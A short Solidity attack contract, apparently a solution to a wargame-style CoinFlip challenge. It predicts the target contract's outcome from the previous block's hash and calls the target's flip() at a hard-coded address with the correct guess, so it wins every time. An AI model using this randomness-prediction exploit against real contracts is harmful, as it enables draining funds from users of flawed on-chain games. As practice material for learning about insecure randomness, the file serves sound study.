// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "src/coinflip/CoinFlip.sol";

contract CoinFlipper {
    CoinFlip internal coinFlipContract =
        CoinFlip(0x8edF4469B93dd1bB9fE35C4507B36221Baa1F009);

    uint256 public consecutiveWins;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        coinFlipContract.flip(side);
    }
}
